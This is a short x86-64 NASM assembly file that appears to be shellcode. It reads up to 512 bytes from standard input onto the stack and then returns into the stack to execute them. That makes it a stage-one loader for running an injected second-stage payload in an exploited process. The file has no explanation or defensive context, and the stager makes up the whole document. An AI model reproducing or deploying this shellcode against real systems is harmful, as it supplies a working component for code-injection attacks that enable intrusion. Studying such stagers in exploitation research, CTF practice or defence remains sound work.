BITS 64

section .text
global _start

_start:
xor eax, eax
xor edi, edi
mov rsi, rsp
mov rdx, 0x200
syscall
push rsp
ret